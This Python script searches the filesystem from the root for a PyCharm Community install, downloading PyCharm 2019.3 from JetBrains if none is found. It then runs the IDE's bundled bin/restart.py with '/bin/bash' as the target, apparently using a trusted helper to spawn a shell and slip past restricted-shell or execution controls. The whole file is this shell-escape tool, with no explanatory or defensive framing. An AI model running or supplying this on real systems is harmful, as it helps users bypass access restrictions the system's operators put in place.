import os
import re
import tarfile

import requests


def find_folder(start_folder, keyword="pycharm.community.[0-9]{4}"):
    syntax_match = re.compile(keyword)
    if not os.path.exists("found.txt"):
        for root, subs, files in os.walk(start_folder):
            for sub in subs:
                if syntax_match.search(str(sub)) is not None:
                    found_path = os.path.join(root, sub)
                    with open("found.txt", "a+") as res:
                        res.write(found_path)
                    return found_path
        return None
    else:
        return open("found.txt").read().strip()


def download_and_extract():
    url = "https://download.jetbrains.com/python/pycharm-community-2019.3.tar.gz?_ga=2.131709836.2013667237.1575782268-1211066101.1550646362"
    local_filename = "pycharm-community-2019.3.tar.gz"
    print("[i] downloading pycharm")
    with requests.get(url, stream=True) as r:
        with open(local_filename, 'wb') as res:
            for chunk in r.iter_content(chunk_size=4192):
                if chunk:
                    res.write(chunk)
    print("[i] extracting pycharm")
    tar = tarfile.open(local_filename, "r:gz")
    tar.extractall()
    tar.close()
    return local_filename


def call_shell(full_path):
    command = (
        "python {}/bin/restart.py -1 / /bin/bash".format(full_path)
    )
    os.system(command)


def main():
    print("[i] finding local download path")
    pycharm_download_path = find_folder("/")
    if pycharm_download_path is not None:
        print("[i] running command")
        call_shell(pycharm_download_path)
    else:
        import os

        print("[!] pycharm download path not found")
        download_and_extract()
        pycharm_download_path = find_folder(os.getcwd())
        call_shell(pycharm_download_path)


if __name__ == "__main__":
    main()
